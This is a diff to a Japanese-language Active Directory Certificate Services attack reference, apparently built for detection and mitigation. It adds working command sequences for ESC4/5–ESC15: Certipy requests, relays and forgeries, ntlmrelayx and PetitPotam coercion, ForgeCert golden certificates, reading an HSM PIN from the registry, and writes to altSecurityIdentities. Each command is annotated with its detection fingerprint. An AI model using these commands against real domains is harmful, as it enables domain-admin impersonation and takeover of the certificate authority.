     "detect": "テンプレートオブジェクトへの変更(5136 ディレクトリサービスオブジェクト変更)で msPKI-Certificate-Name-Flag / pKIExtendedKeyUsage / msPKI-Enrollment-Flag の改変を監視。SACL監査を有効化しておく。",
     "events": "5136, 4899(テンプレート更新), 4886, 4887",
     "mitigate": "テンプレートのDACLを見直し、書き込み権限を PKI 管理者グループのみに限定。Certificate Templates コンテナに変更監査(SACL)を設定し、5136アラートを整備する。",
@@ -3617,6 +5959,28 @@ AD.I18N.ja.attacks = [
     "summary": "CAのADオブジェクト(pKIEnrollmentService, NTAuthCertificates)やCAサーバのコンピュータオブジェクト・関連ADコンテナに対する過剰な権限を悪用し、PKI全体の設定改変やCA制御に至る。",
     "how": "前提: CN=Public Key Services 配下のオブジェクト(Enrollment Services, NTAuthCertificates, AIA/CDP)やCAホストコンピュータオブジェクトへの書き込み権限を保有。手順はNTAuthCertificatesに攻撃者CA証明書を追加する、CAコンピュータをRBCD/シャドウクレデンシャルで乗っ取りESC7/Golden Certificateへ発展させる。",
     "tools": "Certipy, PowerView, BloodHound, StandIn, Rubeus/Whisker(シャドウクレデンシャル)",
+    "cmd": [
+      {
+        "tool": "certutil.exe",
+        "t": "攻撃者CA証明書をNTAuthCertificatesへ登録し以後の偽造証明書を信頼させる。`-dspublish`と`NTAuthCA`が決定的文字列",
+        "q": "certutil -dspublish -f rogue-ca.crt NTAuthCA"
+      },
+      {
+        "tool": "Certipy",
+        "t": "CAサーバのコンピュータオブジェクトにシャドウ資格情報を追加し乗っ取る。msDS-KeyCredentialLink書込みが4742/5136に残る",
+        "q": "certipy shadow auto -u svc_user@corp.local -p 'Passw0rd!' -account 'CA01$' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "シャドウ資格情報の証明書でCA機自身のTGTを要求。`/certificate:`が対象マシン機の乗っ取り確定シグナル",
+        "q": "Rubeus.exe asktgt /user:CA01$ /certificate:ca01_shadow.pfx /ptt"
+      },
+      {
+        "tool": "Certipy",
+        "t": "乗っ取ったCA秘密鍵でGolden Certificateを偽造。ESC5から偽造系攻撃への転換点",
+        "q": "certipy forge -ca-pfx corp-ca.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local' -out forged.pfx"
+      }
+    ],
     "detect": "NTAuthCertificatesやEnrollment Servicesオブジェクトの変更(5136)、CAコンピュータオブジェクトのmsDS-KeyCredentialLink/msDS-AllowedToActOnBehalf改変を監視。BloodHoundで到達性を定期監査する。",
     "events": "5136, 4662, 4742(コンピュータ変更)",
     "mitigate": "Public Key Services 配下および CA ホストの権限をTier0管理者に限定。CAサーバはTier0資産として隔離管理し、委任(RBCD)やKeyCredential書込を厳格に制限する。",
@@ -3657,6 +6021,28 @@ AD.I18N.ja.attacks = [
     "summary": "CAに EDITF_ATTRIBUTESUBJECTALTNAME2 フラグが設定されていると、テンプレート設定に関係なく申請時のリクエスト属性でSANを任意指定でき、あらゆる認証テンプレートで成りすましが可能になる。",
     "how": "前提: CAポリシーモジュールで EDITF_ATTRIBUTESUBJECTALTNAME2 が有効(certutil -getreg policy\\EditFlags で確認)。手順は任意のClient Authテンプレートを certipy req -upn administrator@domain.local のようにSAN属性付きで申請しDA成りすまし証明書を得て認証する。重要(現況): KB5014754の強力な証明書マッピングは2025年2月更新でFull Enforcement(StrongCertificateBindingEnforcement=2)が既定化、2025年9月9日更新で同レジストリ値が無効化され強制のみとなった。強制下ではCAが申請者本人のSIDセキュリティ拡張を証明書へ埋め込むため、単独のESC6によるSAN成りすましはパッチ済みDCでは無効化される。現在も成立するのは(a)DCが互換モード(=1/0)のまま、(b)SID拡張が付かない条件との連鎖(ESC6+ESC9/ESC16)、(c)SAN内へSID-URL(tag:microsoft.com,2022-09-14:sid:<SID>)を注入してKDCの強制マッピングを迂回、のいずれか。",
     "tools": "Certipy req (-upn/-sid), Certify request /altname",
+    "cmd": [
+      {
+        "tool": "certutil.exe",
+        "t": "CAにEDITF_ATTRIBUTESUBJECTALTNAME2が立っているか確認。`-getreg`と`policy\\EditFlags`の組合せがCA向け偵察の指紋",
+        "q": "certutil -config ca01.corp.local\\corp-CA -getreg policy\\EditFlags"
+      },
+      {
+        "tool": "Certipy",
+        "t": "EKU制限のない通常テンプレートでもリクエスト属性でSAN指定が通る。`-upn`単独指定がテンプレート設定と矛盾する",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template User -upn administrator@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "Full Enforcement下の迂回策としてSAN内にSID-URLを注入。`-sid`パラメータ付与がKB5014754強制回避の痕跡",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-1111111111-2222222222-3333333333-500"
+      },
+      {
+        "tool": "Certify.exe",
+        "t": "Windows側の同等操作。EKU制限外のテンプレート名と`/altname:`administratorの組合せが手掛かり",
+        "q": "Certify.exe request /ca:ca01.corp.local\\corp-CA /template:User /altname:administrator@corp.local"
+      }
+    ],
     "detect": "CA構成の EditFlags を定期監査。4887で要求者と異なるSAN(UPN)を持つ証明書発行を検知。certipy find がESC6として警告する。",
     "events": "4887, 4886, 4768",
     "mitigate": "certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 でフラグを無効化し、CADサービスを再起動する。定期的にCAレジストリ構成をベースラインと比較する。",
@@ -3697,6 +6083,33 @@ AD.I18N.ja.attacks = [
     "summary": "低権限ユーザーがCAに対しManageCA(CA管理者)やManageCertificates(証明書管理者)権限を持つ場合、CAフラグ変更・失敗要求の承認・テンプレート有効化などで証明書発行を掌握する。",
     "how": "前提: CAのセキュリティ権限にManageCA/ManageCertificates付与。手順(A) ManageCAで EDITF_ATTRIBUTESUBJECTALTNAME2 を有効化しESC6化。手順(B) SubCAテンプレートを申請→拒否させ、ManageCertificatesで certipy ca -issue-request <ID> により失敗要求を強制承認して証明書を取得する。",
     "tools": "Certipy ca (-add-officer/-enable-template/-issue-request), Certify, PSPKI",
+    "cmd": [
+      {
+        "tool": "certutil.exe",
+        "t": "ManageCA権限でCAのSAN任意指定フラグを有効化しESC6状態を作る。`-setreg`と`EDITF_ATTRIBUTESUBJECTALTNAME2`が決定的",
+        "q": "certutil -config ca01.corp.local\\corp-CA -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2"
+      },
+      {
+        "tool": "net.exe",
+        "t": "フラグ反映のためCAサービス再起動が必須。certsvcの停止/起動がCAサーバの4886直前に必ず発生する",
+        "q": "net stop certsvc && net start certsvc"
+      },
+      {
+        "tool": "Certipy",
+        "t": "ManageCertificatesで無効化されたSubCAテンプレートを有効化。`-enable-template`実行がCA監査ログの権限変更として残る",
+        "q": "certipy ca -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -enable-template SubCA"
+      },
+      {
+        "tool": "Certipy",
+        "t": "有効化したSubCAテンプレートを申請。通常はマネージャ承認待ちで保留になり4889が先行する",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template SubCA"
+      },
+      {
+        "tool": "Certipy",
+        "t": "ManageCertificatesで保留中の要求を強制承認し発行。`-issue-request`と要求IDの組合せが4887直前の決定的操作",
+        "q": "certipy ca -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -issue-request 782"
+      }
+    ],
     "detect": "CA役割割当の変更や、拒否された要求(4888=要求拒否)の後に同一RequestIDで発行(4887)される相関、ManageCertificatesによる失敗要求の強制承認を監視。CA officer追加(4890/4892 CA構成変更)を検知する。",
     "events": "4882(CAセキュリティ変更), 4885/4890/4892(CA構成/役割変更), 4887",
     "mitigate": "CAのManageCA/ManageCertificatesを最小限のPKI管理者のみに付与。CA権限変更を監査し、SubCA等の危険テンプレートを無効化。定期的にcertipy find/PSPKIでCA officerを棚卸しする。",
@@ -3732,6 +6145,28 @@ AD.I18N.ja.attacks = [
     "summary": "CAのWeb Enrollmentエンドポイント(certsrv, /certsrv/certfnsh.asp)がHTTP+NTLMを受け付ける場合、被害マシン(特にDC)の認証をNTLMリレーして、そのマシンアカウント用のクライアント認証証明書を発行させる。",
     "how": "前提: HTTP Web Enrollment有効かつEPA(Extended Protection)未設定。手順は certipy relay -target http://<ca>/certsrv でリレーサーバを起動し、PetitPotam/PrinterBug/DFSCoerce等でDC$の認証を強制コアーション、リレーでDC$の証明書を取得。得た証明書で certipy auth によりDC$のTGT取得→DCSyncへ発展する。",
     "tools": "Certipy relay, ntlmrelayx -t http://ca/certsrv/certfnsh.asp, PetitPotam, Coercer, PrinterBug, DFSCoerce",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "Web Enrollmentへのリレーサーバを起動。Linux実行のため端末ログは残らずCA側4886の送信元がDC以外になる点が手掛かり",
+        "q": "certipy relay -target http://ca01.corp.local/certsrv/ -ca corp-CA -template DomainController"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "Impacket版のADCSリレー。`--adcs`と`--template`がADCSを狙ったリレーであることの識別子",
+        "q": "ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "MS-EFSRPCでDCの認証を強制しリレーへ流し込む。パッチ後は`-u/-p/-d`必須でDC側にEFSRPC呼び出しの痕跡が残りうる",
+        "q": "PetitPotam.py -d corp.local -u svc_user -p 'Passw0rd!' 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "リレーで得たDC$証明書でDC自身として認証しTGT取得。以後のDCSyncへ直結する最終ステップ",
+        "q": "certipy auth -pfx 'dc01$.pfx' -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "Web Enrollment(IIS)アクセスログで異常なマシンアカウント認証。4886/4887でコンピュータアカウント宛のDomainController/Machine証明書発行。認証元IPと本来のホスト不一致、MS-EFSR/MS-RPRN経由のコアーションを検知。",
     "events": "4886, 4887, 4768, IISログ(certsrv), 5145(EFSRPC/spoolss)",
     "mitigate": "HTTP Web EnrollmentでEPA(Extended Protection for Authentication)とチャネルバインディング/HTTPS必須化、NTLM無効化(Kerberos/Negotiateのみ)。不要ならWeb Enrollment役割を削除。PetitPotam等のコアーション対策(パッチ・RPCフィルタ)を実施する。",
@@ -3772,6 +6207,28 @@ AD.I18N.ja.attacks = [
     "summary": "テンプレートに CT_FLAG_NO_SECURITY_EXTENSION が設定され証明書にSID紐付けのセキュリティ拡張(szOID_NTDS_CA_SECURITY_EXT)が入らないと、StrongCertificateBindingEnforcement が互換(1)/無効(0)の場合にUPN書き換えによる成りすまし(ESC10類似)が可能になる。フル強制(2)ではSID拡張を欠く証明書は強い(明示的)マッピングが無い限り拒否され成立しない。KB5014754により2025年2月11日更新でFull Enforcement(=2)が既定化し、2025年9月9日更新で StrongCertificateBindingEnforcement レジストリ値自体が恒久的に廃止(強制モードに固定)されたため、最新パッチ済みDCは互換モードへ戻すことができず単独ESC9は不成立。現実的に狙えるのは、レジストリがまだ有効な未パッチ(2025年9月更新未適用)で互換モードに固定されたDC、またはCA側でSID紐付けを供給/欠落させる連鎖—SANへの任意SID-URL注入を許すESC6、あるいはCA全体でSIDセキュリティ拡張を無効化するESC16—と組み合わせる場合に限られる。",
     "how": "前提: 対象テンプレートのmsPKI-Enrollment-FlagにNO_SECURITY_EXTENSION、かつ被害者アカウントのUPN書換権限(GenericWrite)を保有。手順は被害アカウントのuserPrincipalNameを administrator に書換→そのアカウントでNO_SECURITY_EXTENSIONテンプレートを申請→UPNを元に戻す→取得証明書でadministratorとして認証。SIDバインディングが無いためUPNマッピングで昇格する。",
     "tools": "Certipy (account update -upn, req, auth), PowerView Set-ADObject",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "被害アカウントのUPNを一時的にadministratorへ書換え。`account update -upn`実行がAD属性変更5136に残る",
+        "q": "certipy account update -u svc_user@corp.local -p 'Passw0rd!' -user victim -upn administrator@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "SID拡張の付かないテンプレートを被害アカウント名義で申請。テンプレートがCT_FLAG_NO_SECURITY_EXTENSIONを持つ点が要確認",
+        "q": "certipy req -u victim@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template NoExtension-Template"
+      },
+      {
+        "tool": "Certipy",
+        "t": "発行後にUPNを元へ戻す証跡隠滅の一手。直前の書換えと数分以内で往復するペアパターンが検知の核",
+        "q": "certipy account update -u svc_user@corp.local -p 'Passw0rd!' -user victim -upn victim@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "取得証明書でadministratorとして認証成立。SID拡張が無いためStrongCertificateBindingEnforcement互換モードのDCでのみ通る",
+        "q": "certipy auth -pfx victim.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "アカウントのuserPrincipalNameの頻繁な変更(5136)、SIDセキュリティ拡張を欠く証明書での認証。4768/4769でCertificate Information欄とアカウントSID不整合を監視する。",
     "events": "5136, 4886, 4887, 4768",
     "mitigate": "テンプレートから NO_SECURITY_EXTENSION フラグを外しSIDセキュリティ拡張を必須化する。KB5014754の強制モードは2025年2月11日更新でFull Enforcement(StrongCertificateBindingEnforcement=2)が既定化し、2025年9月9日更新以降は同レジストリ値が無視され強制のみとなるため、DCを最新パッチへ更新して互換/無効モードへの後退や手動の=1/0上書きを排除する。ただしDC側の強制だけでは連鎖経路を塞げないため、CA側もあわせて監査する—EDITF_ATTRIBUTESUBJECTALTNAME2による任意SAN指定(ESC6)を無効化し、CAのポリシー(DisableExtensionList等)でszOID_NTDS_CA_SECURITY_EXTが無効化(ESC16)されていないことを確認する。UPN書換権限(GenericWrite/WriteProperty)を最小化し、被害アカウントのUPN往復変更を監視する。",
@@ -3812,6 +6269,28 @@ AD.I18N.ja.attacks = [
     "summary": "ESC10は弱い暗黙的証明書マッピングを悪用する。DCが弱いUPN/DNSマッピングを許す場合—Kerberosで StrongCertificateBindingEnforcement が Compatibility(互換)モード(Case1)、またはSchannelで CertificateMappingMethods がUPN(0x4)を許可(Case2)—攻撃者は証明書のUPN/メール属性を書換えて他主体に成りすます。強制状況の注意: KB5014754のFull Enforcement(2025年2月11日既定化、2025年9月9日以降はオプトアウト廃止で必須)は弱いKerberosマッピングを拒否するため、Case1は互換モードのまま残されたDCでのみ成立する。SchannelのCase2はKerberos強制とは別系統の制御として残存する。",
     "how": "前提(Case1, Kerberos): DCが弱いマッピングを許可している必要がある—StrongCertificateBindingEnforcement が Compatibility(互換)モード(レジストリ値1。旧Disabled/0は2023年4月以降互換モード相当で、現在は無視される)。手順: 被害アカウントのUPNを administrator に書換→任意Client Authテンプレートを申請→UPNを戻す→証明書でadmin認証(KDCが弱いUPNマッピングにフォールバック)。Full EnforcementのDCではこのフォールバックが拒否されCase1は不成立。前提(Case2, Schannel): CertificateMappingMethods 0x4(UPN)有効。マシンアカウントのUPNを空にしDC$@… へ書換えてSchannel経由(LDAPS等)でDCに成りすます。この経路はKerberosの強制変更の影響を受けず引き続き有効。",
     "tools": "Certipy (account update, req, auth -ldap-shell), PowerView",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "Case1(Kerberos互換マッピング)起点。被害者UPNをadministratorへ書換え、通常テンプレートを申請できる状態を作る",
+        "q": "certipy account update -u svc_user@corp.local -p 'Passw0rd!' -user victim -upn administrator@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "取得証明書でLDAP認証まで直接確立。`-ldap-shell`はNTLMハッシュ化を経ずに即LDAP操作へ移れる高リスク動線",
+        "q": "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -ldap-shell"
+      },
+      {
+        "tool": "Certipy",
+        "t": "Case2(Schannel CertificateMappingMethods=UPN)起点。マシン機のUPNを一旦空にする不可逆に近い操作",
+        "q": "certipy account update -u svc_user@corp.local -p 'Passw0rd!' -user 'victim$' -upn ''"
+      },
+      {
+        "tool": "Certipy",
+        "t": "Case2続き。UPNを標的DCのマシンアカウント名へ書換えSchannel経由でDCへ成りすます",
+        "q": "certipy account update -u svc_user@corp.local -p 'Passw0rd!' -user 'victim$' -upn 'dc01$@corp.local'"
+      }
+    ],
     "detect": "StrongCertificateBindingEnforcement(Kerberos/Kdcsvc)と Schannel CertificateMappingMethods を監査する。Kerberosの残存する弱マッピング状態は互換(Compatibility)モード(値1)であり、該当DCでは弱い/強マッピング不在の証明書が認証されるたびにKDCが警告イベント(イベントID 39、および40/41)を記録する—これはESC10 Case1および正規の弱証明書双方に対する高価値の検知シグナルとなる。UPN属性の一時的書換(userPrincipalNameの5136)や、弱いマッピングに依存するSchannel/Kerberos認証を監視する。",
     "events": "5136, 4768, 4769, 4624(Schannel), KDC 39/40/41(weak or mismatched certificate mapping warnings, System log)",
     "mitigate": "Full Enforcement(StrongCertificateBindingEnforcement=2)を推奨。2025年2月11日更新以降、値未設定のDCは既定でFull Enforcementへ移行し、2025年9月9日更新以降は値自体が考慮されず(互換/オプトアウト廃止)強マッピングが常時強制される→Case1は同更新前に互換モードへ固定されたDCを除き無効化される。SchannelはCertificateMappingMethodsからUPN(0x4)を外し、強いマッピング(SKIまたはIssuer+Serial)のみ許可する。Case2はKerberosの強制状態に関係なく残存する別系統のSchannel制御。運用上の注意: 2025年9月の強制化は弱くマッピングされた正規証明書(802.1X Wi-Fi、VPN、スマートカード、SCEP/NDES発行)を多数破壊したため、強制を防御ベースラインとする前に、影響証明書を szOID_NTDS_CA_SECURITY_EXT のSID拡張付き(強マッピング)で再発行し、大規模な認証障害を回避すること。KB5014754準拠のパッチ適用と、UPN書換(userPrincipalNameへのwrite-property)権限の制限を行う。",
@@ -3847,6 +6326,28 @@ AD.I18N.ja.attacks = [
     "summary": "CAのICertPassage(MS-ICPR) RPCインターフェースがパケットプライバシー(暗号化)を強制していない場合、NTLM認証をRPC経由でリレーして証明書を発行させる。ESC8のRPC版でWeb Enrollment不要。",
     "how": "前提: CAレジストリのInterfaceFlagsで IF_ENFORCEENCRYPTICERTREQUEST が未設定。手順はパッチ適用済みntlmrelayx/CertipyでICPR RPCエンドポイント(-rpc)を標的にリレーサーバを起動、コアーションで被害アカウント認証を誘発し、RPCリレーでその証明書を発行させ認証に利用する。",
     "tools": "Certipy relay -target rpc://<ca>, ntlmrelayx(-rpc ICPR対応版), PetitPotam/Coercer",
+    "cmd": [
+      {
+        "tool": "certutil.exe",
+        "t": "RPCリクエストの暗号化強制設定を確認。`InterfaceFlags`にIF_ENFORCEENCRYPTICERTREQUESTが無ければESC11成立の前提偵察",
+        "q": "certutil -config ca01.corp.local\\corp-CA -getreg policy\\InterfaceFlags"
+      },
+      {
+        "tool": "Certipy",
+        "t": "ICertPassage RPC(MS-ICPR)へのリレー。`rpc://`スキームがWeb版ESC8のリレーと区別する決め手",
+        "q": "certipy relay -target rpc://ca01.corp.local -ca corp-CA -template DomainController"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "DCの認証を強制しRPCリレーへ流し込む。ESC8と同じ強制手口だがリレー先がRPCな点が違い",
+        "q": "PetitPotam.py -d corp.local -u svc_user -p 'Passw0rd!' 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "リレーで取得したDC$証明書で認証しTGT取得。ESC8と同じ最終形でDCSyncへ発展しうる",
+        "q": "certipy auth -pfx 'dc01$.pfx' -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "4886/4887でRPC(ICPR)経由の証明書要求と、要求元とネットワーク経路の不一致を検知。コアーションイベントとCA発行を相関する。",
     "events": "4886, 4887, 4768, 5145",
     "mitigate": "CAで IF_ENFORCEENCRYPTICERTREQUEST を有効化(certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST)しRPC暗号化を強制。ドメイン全体でNTLM制限とコアーション対策(RPCフィルタ)を実施する。",
@@ -3887,6 +6388,28 @@ AD.I18N.ja.attacks = [
     "summary": "CA秘密鍵がYubiHSM等のHSMに格納されていても、レジストリに静的PINが保存されCA上でシェルを取得できれば、HSM経由でCA秘密鍵を利用してGolden Certificateを偽造できる。",
     "how": "前提: CAサーバでの管理者シェル、HSMのauth key(PIN)が HKLM\\SOFTWARE\\Yubico\\YubiHSM 等のレジストリに平文保存。手順はPINを読み出し、yubihsm-connector経由でCA秘密鍵を用いた署名を行い、任意ユーザー用の証明書(Golden Certificate)を偽造して長期成りすまし・永続化する。",
     "tools": "reg query, yubihsm-shell/connector, Certipy forge, ForgeCert",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "HSMの認証PINをレジストリから平文取得。`YubiHSM`キー配下への`query`がCA管理者権限奪取後の典型操作",
+        "q": "reg query \"HKLM\\SOFTWARE\\Yubico\\YubiHSM\" /s"
+      },
+      {
+        "tool": "yubihsm-shell",
+        "t": "窃取したPINでHSMコネクタに接続しCA秘密鍵を利用可能にする。CAサーバ上での不審なプロセス起動としてEDRに残る",
+        "q": "yubihsm-shell --connector http://127.0.0.1:12345 --authkey 1 --password Passw0rd!"
+      },
+      {
+        "tool": "ForgeCert",
+        "t": "HSM経由で得たCA秘密鍵でGolden Certificateを偽造。`--CaCertPath`と`--SubjectAltName`が偽造行為そのものの指紋",
+        "q": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword 'Passw0rd!' --Subject \"CN=Administrator,CN=Users,DC=corp,DC=local\" --SubjectAltName administrator@corp.local --NewCertPath forged.pfx --NewCertPassword 'Passw0rd!'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "偽造証明書で任意ユーザーとして認証。CA自体が正規発行者のためチェーン検証だけでは検知不能でCA監査ログとの相関が必須",
+        "q": "certipy auth -pfx forged.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "CAサーバへの対話ログオン(4624 type2/10)や機微レジストリキー読取を監視。CA鍵での予期しない署名活動、Golden Certificate由来の長期証明書認証(4768)を検知する。",
     "events": "4624, 4672, 4768",
     "mitigate": "CAサーバをTier0として厳格に隔離しシェルアクセスを最小化。HSM PINをレジストリ平文保存せずセキュアに管理し、HSM操作を監査。CAサーバへの特権アクセスをPAW経由に限定する。",
@@ -3922,6 +6445,28 @@ AD.I18N.ja.attacks = [
     "summary": "証明書テンプレートの発行ポリシーOIDがmsDS-OIDToGroupLinkでADグループにリンクされている場合、そのテンプレートで発行された証明書での認証時に当該グループのメンバーシップが付与され、特権グループへ実質昇格する。",
     "how": "前提: あるIssuance Policy OIDが特権グループ(例: 高権限グループ)にリンクされ、そのOIDを持つテンプレートに低権限Enroll権限がある。手順は certipy find でESC13を特定し、該当テンプレートを申請→取得証明書で certipy auth 認証すると、KerberosトークンにリンクされたグループSIDが載り昇格する。",
     "tools": "Certipy (find/req/auth), PowerView(msDS-OIDToGroupLink列挙)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "OIDのADグループリンク(msDS-OIDToGroupLink)を検出。出力のESC13ラベルと紐付くグループ名が調査起点",
+        "q": "certipy find -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -stdout"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "OIDコンテナを直接列挙しグループリンクを確認。AD拡張モジュール利用のため4104より4662(オブジェクトアクセス)が主な痕跡",
+        "q": "Get-ADObject -SearchBase 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' -Filter '*' -Properties msDS-OIDToGroupLink"
+      },
+      {
+        "tool": "Certipy",
+        "t": "OIDにリンクされた特権グループを持つテンプレートを申請。テンプレート名と発行ポリシーOIDの組合せが唯一の判別点",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template ESC13-Template"
+      },
+      {
+        "tool": "Certipy",
+        "t": "発行証明書で認証すると同時にリンク先グループのSIDがKerberosトークンへ付与される。4768のグループ拡張で昇格が確認できる",
+        "q": "certipy auth -pfx svc_user.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "OIDコンテナ(msPKI-Enterprise-Oid)のmsDS-OIDToGroupLink設定を監査。該当テンプレート発行(4887)後の特権グループ相当ログオンを相関検知する。",
     "events": "4887, 4768, 4769, 5136",
     "mitigate": "msDS-OIDToGroupLinkによるグループリンクを棚卸しし、特権グループへのOIDリンクを解除。リンクが必要な場合は対象テンプレートのEnroll権限を厳格化しマネージャ承認を必須化する。",
@@ -3962,6 +6507,28 @@ AD.I18N.ja.attacks = [
     "summary": "対象アカウントのaltSecurityIdentities属性へ書込権限があれば、攻撃者が制御する証明書を明示マッピングして成りすませる(Scenario A)。またターゲットが弱い明示マッピング(X509RFC822=メール, X509SubjectOnly=サブジェクトのみ, X509IssuerSubject=発行者+サブジェクト)を保持する場合、攻撃者は被害プリンシパルのmail/cn/dNSHostNameをマッピング値に一致させ、被害者として発行した証明書で対象に成りすませる(Scenario B/C/D)。強マッピング(X509IssuerSerialNumber/X509SKI/X509SHA1PublicKey)は再利用不能な識別子に束縛されるため耐性がある。",
     "how": "Scenario A(altSecurityIdentitiesへWrite): 自分が発行/保有する証明書のマッピング文字列を対象のaltSecurityIdentitiesに追記し、その証明書で対象としてPKINIT/Schannel認証する(書込権があるため強マッピング形式でも任意の攻撃者証明書を紐付け可能)。Scenario B/C/D(ターゲットが弱い明示マッピングを保持): 被害プリンシパルのmail(X509RFC822)またはcn/dNSHostName(X509SubjectOnly/X509IssuerSubject)を対象のマッピング値へ一致させ、被害者として証明書を申請し対象として認証する。certipy find でESC14候補(弱い明示マッピング/書込可能属性)を列挙し、certipy req→certipy authで悪用。",
     "tools": "Certipy, PowerView Set-ADObject(altSecurityIdentities), Rubeus",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "弱い明示マッピング(altSecurityIdentities)や書込可能な対象アカウントを検出",
+        "q": "certipy find -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -stdout"
+      },
+      {
+        "tool": "PowerView",
+        "t": "Scenario A。攻撃者証明書のマッピング文字列を対象のaltSecurityIdentitiesへ追記。5136の属性変更値に`X509:`文字列が残る",
+        "q": "Set-ADObject -Identity 'CN=Administrator,CN=Users,DC=corp,DC=local' -Add @{altSecurityIdentities='X509:<I>DC=local,DC=corp,CN=corp-CA<S>CN=svc_user,CN=Users,DC=corp,DC=local'}"
+      },
+      {
+        "tool": "Certipy",
+        "t": "Scenario B/C/D。被害者の弱いマッピング値(mail等)と一致するSAN/Subjectで証明書を申請",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template User -upn victim@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "取得証明書でマッピング先の対象として認証成立。TGTの対象プリンシパルと申請者アカウントの不一致が唯一の手掛かり",
+        "q": "certipy auth -pfx svc_user.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "altSecurityIdentities属性の変更(5136)を高シグナルとして監視。特に管理者・サービスアカウントへの明示マッピング追加を検知する。",
     "events": "5136, 4768, 4769, 4624",
     "mitigate": "altSecurityIdentitiesへの書込権限に加え、mail/cn/dNSHostNameへの書込権限も厳格に制限する。弱い明示マッピング(X509RFC822/X509SubjectOnly/X509IssuerSubject)を廃止し、強いマッピング(X509IssuerSerialNumber/X509SKI/X509SHA1PublicKey)のみへ移行。KB5014754に沿ってCertificateMappingMethods/StrongCertificateBindingEnforcementの強制を確認し、これら属性変更に監査アラートを設定する。",
@@ -4002,6 +6569,28 @@ AD.I18N.ja.attacks = [
     "summary": "スキーマバージョン1(V1)テンプレートでは、CSRのApplication Policies拡張を通じて任意のEKU(Client Authentication等)や登録代理を注入でき、Enrollee-supplies-subjectのV1テンプレート(例: WebServer)から認証用証明書を偽造できる。",
     "how": "前提: V1テンプレート(schemaVersion=1、例: WebServer)にEnroll権限。手順は certipy req -template WebServer -application-policies '1.3.6.1.5.5.7.3.2'(Client Auth)や '...20.2.1'(Enrollment Agent)を指定してCSRにApplication Policies拡張を注入し、SAN成りすまし証明書やEnrollment Agent証明書を取得して認証・代理発行に用いる。",
     "tools": "Certipy (req -application-policies), 手製CSR(openssl)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "V1スキーマかつEnrollee-Supplies-SubjectのテンプレートをESC15候補として検出",
+        "q": "certipy find -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -stdout"
+      },
+      {
+        "tool": "Certipy",
+        "t": "CSRのApplication Policies拡張にClient Authenticationを注入しV1テンプレートから認証用証明書を偽装取得。`-application-policies` と OID `1.3.6.1.5.5.7.3.2` の同居が決定的",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template WebServer -application-policies '1.3.6.1.5.5.7.3.2' -upn administrator@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "同じ穴でCertificate Request Agent EKUを注入し登録代理証明書を偽装取得、ESC3へ連鎖できる。OID`1.3.6.1.4.1.311.20.2.1`が識別子",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "偽装取得した証明書で成りすまし認証。テンプレートのEKU定義上あり得ないClient Auth利用がログ上の矛盾点",
+        "q": "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "V1テンプレートからの発行(4887)で、テンプレート本来のEKUと異なるApplication Policies/EKUを含む証明書を検知。WebServer等サーバ用テンプレートでClient Auth用途の証明書が出るのは異常。",
     "events": "4886, 4887, 4768",
